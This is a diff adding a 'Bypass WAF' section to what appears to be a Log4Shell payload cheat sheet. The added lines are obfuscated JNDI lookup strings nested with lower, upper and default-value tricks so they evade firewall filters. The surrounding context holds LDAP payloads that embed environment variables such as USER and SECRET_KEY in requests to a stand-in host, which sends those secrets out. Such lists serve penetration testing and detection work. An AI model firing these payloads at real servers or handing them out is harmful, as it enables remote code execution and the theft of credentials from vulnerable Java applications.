@@ -13,6 +13,17 @@ ${jndi:ldap://example.com/a${env:USER}}
 ${jndi:ldap://${env:SECRET_KEY}.example.com/}
 ```
 
+## Bypass WAF
+```
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://example.com/a}
+${${::-j}ndi:rmi://example.com/a}
+${jndi:rmi://example.com}
+${${lower:jndi}:${lower:rmi}://example.com/a}
+${${lower:${lower:jndi}}:${lower:rmi}://example.com/a}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://example.com/a}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://example.com/a}
+```
+
 ## Omitting closing brace can lead to data exfil after "/" sign
 `${jndi:ldap://example.com/`
 
